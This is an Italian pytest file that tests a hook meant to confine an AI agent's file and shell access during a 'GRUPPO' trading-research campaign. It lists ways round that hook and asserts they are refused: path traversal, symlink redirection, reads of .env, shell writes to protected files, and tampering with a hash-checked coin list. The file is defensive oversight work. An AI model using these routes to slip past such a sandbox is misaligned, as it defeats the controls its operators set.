"""Il guardiano e la campagna di gruppo (10 ottobre 2026, Passo 4bis).

Che cosa si protegge e perche'. La campagna di gruppo e' una sessione di
campagna con il marcatore `{"tipo": "campagna", "simbolo": "GRUPPO"}`, il branch
`research/campagna/GRUPPO` e la cartella `research/campagne/GRUPPO/`; lavora sui
dati in-sample delle 80 monete di `research/campagne/GRUPPO/monete.csv` (piu'
BTCUSDT come riferimento). Il testo completo e' `research/campagne/GRUPPO/regole.md`,
sezione 12. Il guardiano deve:
  * ammettere `research/data/insample/<X>` solo per X in un insieme ESATTO: le 80
    monete e BTCUSDT per il gruppo, la propria moneta e BTCUSDT per una moneta
    sola (come prima, identico). Mai `GRUPPO`, mai la cartella madre, mai per
    prefisso: le monete di campagna hanno periodi gia' esplorati, che il
    gruppo non deve rivedere;
  * fidarsi dell'elenco solo se ha l'impronta SHA-256 approvata, scritta nel
    guardiano: la sessione puo' scrivere nella propria cartella con uno script,
    e un elenco libero le darebbe i dati di qualunque moneta. Se l'elenco non
    torna, ogni azione e' rifiutata;
  * tenere in sola lettura, per ogni sessione di campagna, l'elenco, le schede,
    `regole.md` e `via_libera_validazione.md`;
  * in un clone a storia limitata (shallow), lasciar guardare la storia solo con
    date e hash: il commit di confine sembra toccare ogni cartella e
    `git log -- <propria cartella>` ne stamperebbe il messaggio, che puo' essere
    del coordinamento (lo si prova qui sotto con un clone `--depth 2`).

Come gli altri test del guardiano: il guardiano gira come hook in un
sottoprocesso, su una radice temporanea che copia il monete.csv VERO del repo
(cosi' l'impronta torna), con il JSON dell'azione su stdin. Per git, un repo vero
con un remoto "nudo", come in test_guardiano_4_4.py. Le lettere A-I sono i casi
della lettura del guardiano fatta prima del lavoro.
"""
from __future__ import annotations

import hashlib
import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

from research.src import guardiano as g

RADICE_REPO = Path(__file__).resolve().parents[3]
GUARDIANO = RADICE_REPO / "research" / "src" / "guardiano.py"
VIETATI_REPO = RADICE_REPO / "research" / "config" / "percorsi_vietati.txt"
MONETE_REPO = RADICE_REPO / "research" / "campagne" / "GRUPPO" / "monete.csv"

RIFIUTO = "[guardiano] azione rifiutata"
ELENCO_RIFIUTATO = "[guardiano] l'elenco delle monete del gruppo non e' quello approvato"
GRUPPO = "sessione campagna GRUPPO"
PROPRIO = "research/campagna/GRUPPO"

#: le 80 monete del gruppo, dal file VERO del repo
MONETE = tuple(MONETE_REPO.read_text(encoding="utf-8").splitlines()[1:])
#: le monete di campagna: le cartelle di research/campagne/ del repo, tranne GRUPPO
CAMPAGNA = tuple(sorted(p.name for p in (RADICE_REPO / "research" / "campagne").iterdir()
                        if p.is_dir() and p.name != "GRUPPO"))
CAMPAGNA_SENZA_BTC = tuple(m for m in CAMPAGNA if m != "BTCUSDT")
#: i file della campagna di gruppo in sola lettura
PROTETTI = (
    "research/campagne/GRUPPO/monete.csv",
    "research/campagne/GRUPPO/schede/AAVEUSDT.md",
    "research/campagne/GRUPPO/regole.md",
    "research/campagne/GRUPPO/via_libera_validazione.md",
)

#: testi riconoscibili nei repo git di prova
MSG_DIARIO_1 = "DIARIO_COORDINAMENTO_1"  # commit di main che non tocca la cartella del gruppo
MSG_DIARIO_2 = "DIARIO_COORDINAMENTO_2"  # idem: e' il commit di confine del clone limitato
MSG_ARCHIVIO = "MESSAGGIO_ARCHIVIO"
CONTENUTO_ARCHIVIO = "ARCHIVIO_RISERVATO"
RISERVATI = (MSG_DIARIO_1, MSG_DIARIO_2, MSG_ARCHIVIO, CONTENUTO_ARCHIVIO)


# ---------------------------------------------------------------------------
# attrezzi
# ---------------------------------------------------------------------------


def _scrivi(radice: Path, percorso: str, testo: str) -> None:
    p = radice / percorso
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(testo, encoding="utf-8")


def _radice_gruppo(radice: Path, marcatore=None) -> Path:
    """Una radice finta con tutto cio' che la sessione di gruppo puo' e non puo' vedere.

    Dati in-sample: le 80 monete e BTCUSDT, nient'altro (le prove con una moneta
    di campagna o GRUPPO sul disco le aggiungono da se'). Marcatore GRUPPO, se
    non se ne chiede un altro (`False` = nessun marcatore).
    """
    if marcatore is None:
        marcatore = {"tipo": "campagna", "simbolo": "GRUPPO"}
    (radice / "research" / "config").mkdir(parents=True)
    shutil.copy(VIETATI_REPO, radice / "research" / "config" / "percorsi_vietati.txt")
    _scrivi(radice, "research/config/parametri.yaml", "gruppo: {}\n")
    _scrivi(radice, "research/config/regole_dimensione.md", "regole di dimensione\n")
    _scrivi(radice, "research/src/motore.py", "# motore\n")
    # i protetti devono ESISTERE sul disco: i comandi che scrivono un nome nudo
    # (cp/rm/mv dopo un cd) si giudicano solo se il bersaglio esiste nella cartella
    _scrivi(radice, "research/src/guardiano.py", "# guardiano segnaposto\n")
    _scrivi(radice, "research/PROTOCOLLO.md", "protocollo\n")
    _scrivi(radice, "research/CHANGELOG.md", "changelog\n")
    _scrivi(radice, "research/lezioni/metodo.md", "metodo\n")
    for moneta in CAMPAGNA:
        _scrivi(radice, f"research/campagne/{moneta}/scheda_moneta.md", f"scheda {moneta}\n")
    cartella = radice / "research" / "campagne" / "GRUPPO"
    cartella.mkdir(parents=True, exist_ok=True)
    shutil.copy(MONETE_REPO, cartella / "monete.csv")
    for moneta in MONETE:
        _scrivi(radice, f"research/campagne/GRUPPO/schede/{moneta}.md", f"scheda {moneta}\n")
    _scrivi(radice, "research/campagne/GRUPPO/regole.md", "regole\n")
    _scrivi(radice, "research/campagne/GRUPPO/via_libera_validazione.md", "via libera\n")
    _scrivi(radice, "research/campagne/GRUPPO/ipotesi.md", "ipotesi\n")
    _scrivi(radice, "research/campagne/GRUPPO/log.jsonl", "")
    _scrivi(radice, "research/campagne/GRUPPO/codice/strategia.py", "# strategia\n")
    for moneta in MONETE + ("BTCUSDT",):
        _scrivi(radice, f"research/data/insample/{moneta}/x.zip", "dati\n")
    _scrivi(radice, "research/data/vault/AAVEUSDT/x.zip", "vault\n")
    _scrivi(radice, "research/data/placebo/data/insample/AAVEUSDT/x.zip", "placebo\n")
    for percorso in ("research/universo/monete_idonee_non_campagna.csv", "research/taratura/placebo/x.md",
                     "research/apertura/campagna.md", "research/prova_processo/x.md",
                     "research/trasferimento/x.md", "research/confronto/x.md", "research/passo4/x.md",
                     "docs/state.md", "ops/results/x.md"):
        _scrivi(radice, percorso, "riservato\n")
    (radice / ".claude").mkdir()
    _scrivi(radice, ".claude/settings.json", "{}\n")
    (radice / ".env").write_text("FINTO=1\n")
    if marcatore is not False:
        _scrivi(radice, "research/.sessione", json.dumps(marcatore))
    return radice


def _esegui(radice: Path, tool_name: str, tool_input):
    """Lancia il guardiano come hook; restituisce (exit code, stderr)."""
    ambiente = dict(os.environ)
    ambiente["CLAUDE_PROJECT_DIR"] = str(radice)
    carico = json.dumps({"tool_name": tool_name, "tool_input": tool_input, "cwd": str(radice)})
    esito = subprocess.run(
        [sys.executable, str(GUARDIANO)], input=carico, capture_output=True, text=True,
        env=ambiente, cwd=str(radice), timeout=20,
    )
    return esito.returncode, esito.stderr


def _bash(radice: Path, comando: str):
    return _esegui(radice, "Bash", {"command": comando})


def _read(radice: Path, percorso: str):
    return _esegui(radice, "Read", {"file_path": percorso})


def _write(radice: Path, percorso: str):
    return _esegui(radice, "Write", {"file_path": percorso, "content": "x"})


def _rifiutato(esito, etichetta: str = GRUPPO) -> None:
    codice, errore = esito
    assert codice == 2, f"BUCO: consentito ({errore!r})"
    assert errore.startswith(RIFIUTO), errore
    assert etichetta in errore, errore


@pytest.fixture(scope="module")
def gruppo(tmp_path_factory) -> Path:
    """La radice del gruppo, condivisa: solo per i giudizi che non cambiano il disco."""
    return _radice_gruppo(tmp_path_factory.mktemp("guardiano_gruppo") / "repo")


@pytest.fixture
def gruppo_nuovo(tmp_path: Path) -> Path:
    """Come `gruppo`, nuova per ogni test: per le prove che cambiano il disco."""
    return _radice_gruppo(tmp_path / "repo")


# ---------------------------------------------------------------------------
# A. l'elenco vero del repo e' quello approvato
# ---------------------------------------------------------------------------


def test_A_elenco_del_repo_ha_l_impronta_approvata():
    dati = MONETE_REPO.read_bytes()
    assert hashlib.sha256(dati).hexdigest() == g._IMPRONTA_MONETE_GRUPPO
    assert dati.startswith(b"simbolo\n") and dati.endswith(b"\n") and b"\r" not in dati
    assert len(MONETE) == g._NUMERO_MONETE_GRUPPO == 80
    assert list(MONETE) == sorted(MONETE)
    assert g.leggi_monete_gruppo(str(RADICE_REPO)) == MONETE


def test_A_elenco_del_repo_non_tocca_le_monete_di_campagna():
    assert len(CAMPAGNA) == 20 and "BTCUSDT" in CAMPAGNA
    assert not set(MONETE) & set(CAMPAGNA)
    assert "BTCUSDT" not in MONETE and "GRUPPO" not in MONETE
    # una scheda per moneta, e nessun'altra
    schede = {p.stem for p in (RADICE_REPO / "research" / "campagne" / "GRUPPO" / "schede").glob("*.md")}
    assert schede == set(MONETE)


# ---------------------------------------------------------------------------
# B. ammessi
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("moneta", MONETE)
def test_B_dati_di_ogni_moneta_del_gruppo_in_lettura_e_scrittura(gruppo: Path, moneta: str):
    assert _read(gruppo, f"research/data/insample/{moneta}/x.zip")[0] == 0
    assert _write(gruppo, f"research/data/insample/{moneta}/1h/nuovo.csv")[0] == 0


@pytest.mark.parametrize(
    "percorso",
    [
        "research/data/insample/BTCUSDT/x.zip",
        "research/data/insample/BTCUSDT",
        "research/data/insample/AAVEUSDT",
        "research/campagne/GRUPPO/log.jsonl",
        "research/campagne/GRUPPO/ipotesi.md",
        "research/campagne/GRUPPO/codice/strategia.py",
        "research/campagne/GRUPPO/consegna.md",
        "research/campagne/GRUPPO/fase0_dati.md",
    ],
)
def test_B_ammessi_in_lettura_e_scrittura(gruppo: Path, percorso: str):
    codice, errore = _read(gruppo, percorso)
    assert codice == 0, errore
    codice, errore = _write(gruppo, percorso)
    assert codice == 0, errore


@pytest.mark.parametrize(
    "percorso",
    PROTETTI + (
        "research/PROTOCOLLO.md",
        "research/CHANGELOG.md",
        "research/lezioni/metodo.md",
        "research/config/parametri.yaml",
        "research/src/motore.py",
        "research/src/guardiano.py",
    ),
)
def test_B_ammessi_in_lettura(gruppo: Path, percorso: str):
    codice, errore = _read(gruppo, percorso)
    assert codice == 0, errore
    codice, errore = _bash(gruppo, f"cat {percorso}")
    assert codice == 0, errore


@pytest.mark.parametrize(
    "comando",
    [
        "ls research/data/insample/AAVEUSDT",
        "cat research/data/insample/AAVEUSDT/x.zip research/data/insample/BTCUSDT/x.zip",
        "ls research/campagne/GRUPPO/schede",
        "sha256sum research/campagne/GRUPPO/monete.csv",
        "head -3 research/campagne/GRUPPO/monete.csv",
        "echo nota >> research/campagne/GRUPPO/ipotesi.md",
        "mkdir -p research/data/insample/ZRXUSDT/1h",
        "python research/campagne/GRUPPO/codice/strategia.py",
        "git add research/campagne/GRUPPO/ipotesi.md",
    ],
)
def test_B_comandi_ammessi(gruppo: Path, comando: str):
    codice, errore = _bash(gruppo, comando)
    assert codice == 0, errore


# ---------------------------------------------------------------------------
# C. vietati, in lettura e in scrittura
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("moneta", CAMPAGNA)
def test_C_cartelle_delle_monete_di_campagna_vietate(gruppo: Path, moneta: str):
    """Comprese `campagne/BTCUSDT/`: di BTCUSDT si usano solo i dati."""
    percorso = f"research/campagne/{moneta}/scheda_moneta.md"
    _rifiutato(_read(gruppo, percorso))
    _rifiutato(_write(gruppo, percorso))
    _rifiutato(_bash(gruppo, f"cat {percorso}"))


@pytest.mark.parametrize("moneta", CAMPAGNA_SENZA_BTC)
def test_C_dati_delle_monete_di_campagna_vietati(gruppo: Path, moneta: str):
    percorso = f"research/data/insample/{moneta}/x.zip"
    _rifiutato(_read(gruppo, percorso))
    _rifiutato(_write(gruppo, percorso))


@pytest.mark.parametrize(
    "percorso",
    [
        "research/data/insample/GRUPPO/x.zip",
        "research/data/insample/GRUPPO",
        "research/data/insample",
        "research/data/insample/",
        "research/data",
        "research/data/insample/aaveusdt/x.zip",  # minuscolo: un'altra cartella
        "research/data/insample/AAVEUSD/x.zip",  # un prefisso di una moneta del gruppo
        "research/data/insample/AAVEUSDTX/x.zip",  # una moneta del gruppo come prefisso
        "research/data/insample/ETH/x.zip",
        "research/data/insample/AAVEUSDT/../ETHUSDT/x.zip",
        "research/data/insample/ETHUSDT/../ETHUSDT/x.zip",
        "research/data/vault/AAVEUSDT/x.zip",
        "research/data/vault/BTCUSDT/x.zip",
        "research/data/placebo/data/insample/AAVEUSDT/x.zip",
        "research/data/placebo",
        "research/universo/monete_idonee_non_campagna.csv",
        "research/taratura/placebo/x.md",
        "research/apertura/campagna.md",
        "research/apertura/gruppo.md",
        "research/vault/APERTURA.md",
        "research/prova_processo/x.md",
        "research/trasferimento/x.md",
        "research/confronto/x.md",
        "research/passo4/x.md",
        "research/campagne",
        "research/campagne/GRUPPO/../ETHUSDT/scheda_moneta.md",
        "research/archivio/campagna/GRUPPO/log.jsonl",
        "docs/state.md",
        "ops/results/x.md",
        ".env",
        "research/campagne/GRUPPO/.env",
        "research/data/insample/AAVEUSDT/.env",
    ],
)
def test_C_resto_vietato(gruppo: Path, percorso: str):
    _rifiutato(_read(gruppo, percorso))
    _rifiutato(_write(gruppo, percorso))


def test_C_percorso_assoluto_di_campagne_btcusdt_vietato(gruppo: Path):
    _rifiutato(_read(gruppo, str(gruppo / "research" / "campagne" / "BTCUSDT" / "scheda_moneta.md")))
    _rifiutato(_read(gruppo, str(gruppo / "research" / "data" / "insample" / "ETHUSDT" / "x.zip")))
    assert _read(gruppo, str(gruppo / "research" / "data" / "insample" / "AAVEUSDT" / "x.zip"))[0] == 0


def test_C_link_da_una_moneta_del_gruppo_a_una_di_campagna(gruppo_nuovo: Path):
    """Un link creato da uno script si giudica per dove porta, non per come si chiama."""
    _scrivi(gruppo_nuovo, "research/data/insample/ETHUSDT/x.zip", "eth\n")
    (gruppo_nuovo / "research/data/insample/AAVEUSDT/eth").symlink_to("../ETHUSDT")
    (gruppo_nuovo / "research/data/insample/ZRXUSDT").rename(gruppo_nuovo / "research/data/insample/ZRX_vero")
    (gruppo_nuovo / "research/data/insample/ZRXUSDT").symlink_to("ETHUSDT")
    _rifiutato(_read(gruppo_nuovo, "research/data/insample/AAVEUSDT/eth/x.zip"))
    _rifiutato(_read(gruppo_nuovo, "research/data/insample/ZRXUSDT/x.zip"))
    _rifiutato(_bash(gruppo_nuovo, "cat research/data/insample/AAVEUSDT/eth/x.zip"))
    _rifiutato(_esegui(gruppo_nuovo, "Grep", {"pattern": "x", "path": "research/data/insample/ZRXUSDT"}))


def test_C_il_rifiuto_cita_il_passo_4bis(gruppo: Path):
    codice, errore = _read(gruppo, "research/data/insample/ETHUSDT/x.zip")
    assert codice == 2 and "Passo 4bis" in errore and "regole.md" in errore, errore


def test_C_data_insample_gruppo_rifiutata_con_l_alternativa(gruppo: Path):
    """`lezioni/metodo.md` consiglia `data/insample/<SIMBOLO>/` per il messaggio di commit
    (fuori da git): per il gruppo quella cartella non esiste, e il rifiuto dice dove scrivere."""
    codice, errore = _write(gruppo, "research/data/insample/GRUPPO/messaggio.txt")
    assert codice == 2 and "research/data/insample/BTCUSDT/" in errore, errore
    assert _write(gruppo, "research/data/insample/BTCUSDT/messaggio.txt")[0] == 0


# ---------------------------------------------------------------------------
# D. l'elenco, le schede, regole.md e il via libera: in sola lettura
# ---------------------------------------------------------------------------


_SCRITTURE = [
    ("Write", lambda p: {"file_path": p, "content": "simbolo\nETHUSDT\n"}),
    ("Edit", lambda p: {"file_path": p, "old_string": "AAVEUSDT", "new_string": "ETHUSDT"}),
    ("MultiEdit", lambda p: {"file_path": p, "edits": [{"old_string": "A", "new_string": "B"}]}),
    ("Bash", lambda p: {"command": f"echo ETHUSDT >> {p}"}),
    ("Bash", lambda p: {"command": f"echo ETHUSDT > {p}"}),
    ("Bash", lambda p: {"command": f"cp research/campagne/GRUPPO/ipotesi.md {p}"}),
    ("Bash", lambda p: {"command": f"mv {p} research/campagne/GRUPPO/vecchio.txt"}),
    ("Bash", lambda p: {"command": f"rm {p}"}),
    ("Bash", lambda p: {"command": f"rm -f {p}"}),
    ("Bash", lambda p: {"command": f"echo ETHUSDT | tee -a {p}"}),
    ("Bash", lambda p: {"command": f"sed -i s/AAVEUSDT/ETHUSDT/ {p}"}),
    ("Bash", lambda p: {"command": f"touch {p}"}),
    ("Bash", lambda p: {"command": f"git add {p}"}),
    ("Bash", lambda p: {"command": f"git rm {p}"}),
    ("Bash", lambda p: {"command": f"git rm --cached {p}"}),
    ("Bash", lambda p: {"command": f"git restore {p}"}),
]


@pytest.mark.parametrize("percorso", PROTETTI)
@pytest.mark.parametrize("strumento, ingresso", _SCRITTURE, ids=[f"{s}-{i}" for i, (s, _) in enumerate(_SCRITTURE)])
def test_D_file_approvati_in_sola_lettura(gruppo: Path, percorso: str, strumento: str, ingresso):
    _rifiutato(_esegui(gruppo, strumento, ingresso(percorso)))


@pytest.mark.parametrize(
    "strumento, ingresso",
    [
        ("Write", {"file_path": "research/campagne/GRUPPO/schede/ETHUSDT.md", "content": "x"}),
        ("Bash", {"command": "mkdir research/campagne/GRUPPO/schede/nuova"}),
        ("Bash", {"command": "cp research/campagne/GRUPPO/ipotesi.md research/campagne/GRUPPO/schede/ETHUSDT.md"}),
        ("Bash", {"command": "rm -r research/campagne/GRUPPO/schede"}),
        ("Bash", {"command": "mv research/campagne/GRUPPO/schede research/campagne/GRUPPO/vecchie"}),
    ],
)
def test_D_niente_schede_nuove_ne_cartella_spostata(gruppo: Path, strumento: str, ingresso):
    _rifiutato(_esegui(gruppo, strumento, ingresso))


@pytest.mark.parametrize("percorso", PROTETTI)
def test_D_protetti_anche_per_le_altre_campagne(tmp_path: Path, percorso: str):
    """Per una campagna di una moneta sono gia' fuori dalla lista bianca, in lettura e scrittura."""
    radice = _radice_gruppo(tmp_path / "repo", {"tipo": "campagna", "simbolo": "ETHUSDT"})
    _rifiutato(_read(radice, percorso), "sessione campagna ETHUSDT")
    _rifiutato(_write(radice, percorso), "sessione campagna ETHUSDT")


def test_D_e_protetto_per_ogni_campagna():
    for percorso in PROTETTI:
        assert g.e_protetto(percorso), percorso
    assert g.e_protetto("research/campagne/GRUPPO/schede")
    assert not g.e_protetto("research/campagne/GRUPPO/ipotesi.md")
    assert not g.e_protetto("research/campagne/GRUPPO/schede_mie/x.md")


# ---------------------------------------------------------------------------
# E. un elenco manomesso sul disco (come farebbe uno script) ferma tutto
# ---------------------------------------------------------------------------


def _righe(radice: Path) -> list[str]:
    return (radice / g.MONETE_GRUPPO).read_text(encoding="utf-8").split("\n")


def _riscrivi(radice: Path, righe: list[str]) -> None:
    (radice / g.MONETE_GRUPPO).write_text("\n".join(righe), encoding="utf-8")


def _con_eth(r: Path) -> None:
    _riscrivi(r, _righe(r)[:-1] + ["ETHUSDT", ""])


def _riga_tolta(r: Path) -> None:
    _riscrivi(r, _righe(r)[:-2] + [""])


def _riordinate(r: Path) -> None:
    righe = _righe(r)
    _riscrivi(r, [righe[0]] + list(reversed(righe[1:-1])) + [""])


def _crlf(r: Path) -> None:
    (r / g.MONETE_GRUPPO).write_bytes(MONETE_REPO.read_bytes().replace(b"\n", b"\r\n"))


def _vuoto(r: Path) -> None:
    (r / g.MONETE_GRUPPO).write_bytes(b"")


def _assente(r: Path) -> None:
    (r / g.MONETE_GRUPPO).unlink()


def _link_a_una_copia(r: Path) -> None:
    """Un link a un file con gli STESSI byte: si rifiuta lo stesso (e' un link)."""
    copia = r / "research" / "campagne" / "GRUPPO" / "codice" / "monete_copia.csv"
    shutil.copy(MONETE_REPO, copia)
    (r / g.MONETE_GRUPPO).unlink()
    (r / g.MONETE_GRUPPO).symlink_to(copia)


def _link_ad_altro(r: Path) -> None:
    (r / g.MONETE_GRUPPO).unlink()
    (r / g.MONETE_GRUPPO).symlink_to(r / "research" / "campagne" / "GRUPPO" / "ipotesi.md")


def _cartella_gruppo_e_un_link(r: Path) -> None:
    """La cartella del gruppo spostata e sostituita da un link: stessi byte, ma per un'altra strada."""
    cartella = r / "research" / "campagne" / "GRUPPO"
    altrove = r / "research" / "campagne_altrove"
    altrove.mkdir()
    cartella.rename(altrove / "GRUPPO")
    cartella.symlink_to(altrove / "GRUPPO")


def _riga_con_percorso(r: Path) -> None:
    righe = _righe(r)
    _riscrivi(r, righe[:5] + ["../../campagne/ETHUSDT"] + righe[6:])


def _senza_a_capo_finale(r: Path) -> None:
    (r / g.MONETE_GRUPPO).write_bytes(MONETE_REPO.read_bytes().rstrip(b"\n"))


def _cartella_al_posto_del_file(r: Path) -> None:
    (r / g.MONETE_GRUPPO).unlink()
    (r / g.MONETE_GRUPPO).mkdir()


def _minuscola(r: Path) -> None:
    (r / g.MONETE_GRUPPO).write_bytes(MONETE_REPO.read_bytes().replace(b"AAVEUSDT", b"aaveusdt"))


def _con_bom(r: Path) -> None:
    (r / g.MONETE_GRUPPO).write_bytes(b"\xef\xbb\xbf" + MONETE_REPO.read_bytes())


def _moneta_del_gruppo_diventa_di_campagna(r: Path) -> None:
    """Il file e' quello approvato, ma sul disco c'e' una cartella di campagna per AAVEUSDT."""
    _scrivi(r, "research/campagne/AAVEUSDT/scheda_moneta.md", "scheda\n")


_MANOMISSIONI = [
    _con_eth, _riga_tolta, _riordinate, _crlf, _vuoto, _assente, _link_a_una_copia, _link_ad_altro,
    _cartella_gruppo_e_un_link, _riga_con_percorso, _senza_a_capo_finale, _cartella_al_posto_del_file,
    _minuscola, _con_bom, _moneta_del_gruppo_diventa_di_campagna,
]
_AZIONI_QUALUNQUE = [
    ("Read", {"file_path": "research/campagne/GRUPPO/ipotesi.md"}),
    ("Read", {"file_path": "research/data/insample/AAVEUSDT/x.zip"}),
    ("Write", {"file_path": "research/campagne/GRUPPO/log.jsonl", "content": "x"}),
    ("Bash", {"command": "ls research/campagne/GRUPPO"}),
    ("Bash", {"command": "git status"}),
    ("Glob", {"pattern": "*.md", "path": "research/campagne/GRUPPO"}),
    ("TodoWrite", {"todos": []}),
]


@pytest.mark.parametrize("manomissione", _MANOMISSIONI, ids=lambda f: f.__name__.strip("_"))
def test_E_elenco_manomesso_ferma_ogni_azione(tmp_path: Path, manomissione):
    radice = _radice_gruppo(tmp_path / "repo")
    manomissione(radice)
    for strumento, ingresso in _AZIONI_QUALUNQUE:
        codice, errore = _esegui(radice, strumento, ingresso)
        assert codice == 2, f"BUCO: {strumento} {ingresso} consentito con l'elenco manomesso"
        assert errore.startswith(ELENCO_RIFIUTATO), errore
        assert "avvisa l'utente" in errore and "Passo 4bis" in errore, errore


def test_E_elenco_rimesso_a_posto_torna_a_funzionare(tmp_path: Path):
    radice = _radice_gruppo(tmp_path / "repo")
    _con_eth(radice)
    assert _read(radice, "research/campagne/GRUPPO/ipotesi.md")[0] == 2
    shutil.copy(MONETE_REPO, radice / g.MONETE_GRUPPO)
    assert _read(radice, "research/campagne/GRUPPO/ipotesi.md")[0] == 0


# ---------------------------------------------------------------------------
# F. la funzione che legge l'elenco, con l'impronta passata come argomento
# ---------------------------------------------------------------------------


_FINTE = tuple(sorted(f"M{i:02d}USDT" for i in range(80)))


def _radice_elenco(tmp_path: Path, contenuto: bytes) -> tuple[Path, str]:
    """Una radice con le cartelle delle monete di campagna e un elenco dato; e la sua impronta."""
    radice = tmp_path / "repo"
    for moneta in CAMPAGNA:
        (radice / "research" / "campagne" / moneta).mkdir(parents=True)
    percorso = radice / g.MONETE_GRUPPO
    percorso.parent.mkdir(parents=True, exist_ok=True)
    percorso.write_bytes(contenuto)
    return radice, hashlib.sha256(contenuto).hexdigest()


def _elenco(monete, intestazione: str = "simbolo", a_capo: str = "\n") -> bytes:
    return (a_capo.join([intestazione, *monete]) + a_capo).encode("utf-8")


def test_F_elenco_valido_con_la_sua_impronta(tmp_path: Path):
    radice, impronta = _radice_elenco(tmp_path, _elenco(_FINTE))
    assert g.leggi_monete_gruppo(str(radice), impronta=impronta) == _FINTE
    # con l'impronta approvata (quella del file vero) lo stesso elenco non vale
    with pytest.raises(ValueError, match="impronta"):
        g.leggi_monete_gruppo(str(radice))


@pytest.mark.parametrize(
    "contenuto",
    [
        pytest.param(_elenco(_FINTE[:-1] + ("BTCUSDT",)), id="con-BTCUSDT"),
        pytest.param(_elenco(_FINTE[:-1] + ("GRUPPO",)), id="con-GRUPPO"),
        pytest.param(_elenco(_FINTE[:-1] + ("ETHUSDT",)), id="con-moneta-di-campagna"),
        pytest.param(_elenco(_FINTE[:-1]), id="79-righe"),
        pytest.param(_elenco(_FINTE + ("ZZZUSDT",)), id="81-righe"),
        pytest.param(_elenco(("m00usdt",) + _FINTE[1:]), id="minuscole"),
        pytest.param(_elenco(_FINTE[:-1] + (_FINTE[0],)), id="doppione"),
        pytest.param(_elenco(_FINTE[1:], intestazione=_FINTE[0]), id="senza-intestazione"),
        pytest.param(_elenco(_FINTE, intestazione="symbol"), id="intestazione-diversa"),
        pytest.param(_elenco(_FINTE, intestazione="simbolo,serie"), id="due-colonne"),
        pytest.param(_elenco(_FINTE[:40] + ("",) + _FINTE[40:]), id="riga-vuota"),
        pytest.param(_elenco(_FINTE, a_capo="\r\n"), id="crlf"),
        pytest.param(_elenco(_FINTE[:-1] + ("../ETHUSDT",)), id="percorso"),
        pytest.param(_elenco(_FINTE[:-1] + ("M_USDT",)), id="trattino-basso"),
        pytest.param(_elenco(_FINTE[:-1] + (" M79USDT",)), id="spazio"),
        pytest.param(b"", id="vuoto"),
        pytest.param(b"simbolo\n", id="solo-intestazione"),
        pytest.param(b"\xff\xfesimbolo\n", id="non-utf8"),
    ],
)
def test_F_elenco_non_valido(tmp_path: Path, contenuto: bytes):
    radice, impronta = _radice_elenco(tmp_path, contenuto)
    with pytest.raises(ValueError):
        g.leggi_monete_gruppo(str(radice), impronta=impronta)


def test_F_impronta_sbagliata_e_file_assente(tmp_path: Path):
    radice, impronta = _radice_elenco(tmp_path, _elenco(_FINTE))
    with pytest.raises(ValueError, match="impronta"):
        g.leggi_monete_gruppo(str(radice), impronta="0" * 64)
    (radice / g.MONETE_GRUPPO).unlink()
    with pytest.raises(ValueError, match="non si legge"):
        g.leggi_monete_gruppo(str(radice), impronta=impronta)
    assert issubclass(g.ElencoGruppoNonApprovato, ValueError)


def test_F_monete_dati_ammesse_e_un_insieme_esatto():
    assert g.monete_dati_ammesse("ETHUSDT") == {"ETHUSDT", "BTCUSDT"}
    assert g.monete_dati_ammesse("GRUPPO", frozenset(MONETE)) == set(MONETE) | {"BTCUSDT"}
    assert "GRUPPO" not in g.monete_dati_ammesse("GRUPPO", frozenset(MONETE))
    # senza elenco il gruppo ha solo BTCUSDT (ma senza elenco valido il guardiano non arriva qui)
    assert g.monete_dati_ammesse("GRUPPO") == {"BTCUSDT"}


# ---------------------------------------------------------------------------
# G. ricerche ed elenchi sulla cartella dei dati
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "strumento, ingresso, atteso",
    [
        ("Grep", {"pattern": "x", "path": "research/data/insample"}, 2),
        ("Grep", {"pattern": "x", "path": "research/data/insample/"}, 2),
        ("Grep", {"pattern": "x", "path": "research/data"}, 2),
        ("Glob", {"pattern": "*", "path": "research/data/insample"}, 2),
        ("Glob", {"pattern": "**/*.zip", "path": "research/data"}, 2),
        ("Glob", {"pattern": "*", "path": "research/data/placebo"}, 2),
        ("Glob", {"pattern": "../ETHUSDT/*", "path": "research/data/insample/AAVEUSDT"}, 2),
        ("Grep", {"pattern": "x", "path": "research/data/insample/ETHUSDT"}, 2),
        ("Grep", {"pattern": "x", "path": "research/data/insample/AAVEUSDT"}, 0),
        ("Glob", {"pattern": "**/*.zip", "path": "research/data/insample/AAVEUSDT"}, 0),
        ("Grep", {"pattern": "x", "path": "research/data/insample/BTCUSDT"}, 0),
        ("Grep", {"pattern": "x", "path": "research/campagne/GRUPPO/schede"}, 0),
    ],
)
def test_G_ricerche(gruppo: Path, strumento: str, ingresso: dict, atteso: int):
    codice, errore = _esegui(gruppo, strumento, ingresso)
    assert codice == atteso, errore


@pytest.mark.parametrize(
    "comando, atteso",
    [
        ("grep -r x research/data/insample", 2),
        ("grep -r x research/data/insample/", 2),
        ("rg x research/data/insample", 2),
        ("find research/data/insample", 2),
        ("find research/data/insample -name x.zip", 2),
        ("ls research/data/insample", 2),
        ("ls research/data", 2),
        ("du -sh research/data/insample", 2),
        ("cd research/data/insample/AAVEUSDT && ls ..", 2),
        ("cd research/data/insample && ls", 2),
        ("cat research/data/insample/{AAVEUSDT,ETHUSDT}/x.zip", 2),
        ("cat research/data/insample/ETH*/x.zip", 2),  # glob senza risultati: resta com'e', e non e' ammesso
        ("cat research/data/insample/AAVEUSDT/../ETHUSDT/x.zip", 2),
        ("grep -r x research/data/insample/AAVEUSDT", 0),
        ("find research/data/insample/AAVEUSDT -name x.zip", 0),
        ("ls research/data/insample/AAVEUSDT research/data/insample/BTCUSDT", 0),
        ("cat research/data/insample/{AAVEUSDT,ZRXUSDT}/x.zip", 0),
        ("ls research/data/insample/*", 0),  # sul disco solo monete del gruppo e BTCUSDT
        ("cat research/data/insample/E*/x.zip", 0),  # EGLD, ENJ, EOS: tutte del gruppo
    ],
)
def test_G_comandi_sulla_cartella_dei_dati(gruppo: Path, comando: str, atteso: int):
    codice, errore = _bash(gruppo, comando)
    assert codice == atteso, errore
    if atteso == 2:
        assert GRUPPO in errore, errore


@pytest.mark.parametrize("intrusa", ["ETHUSDT", "GRUPPO", "ethusdt"])
def test_G_glob_con_una_cartella_non_ammessa_sul_disco(gruppo_nuovo: Path, intrusa: str):
    """Il glob si espande sul disco e ogni risultato si giudica: basta una cartella in piu'."""
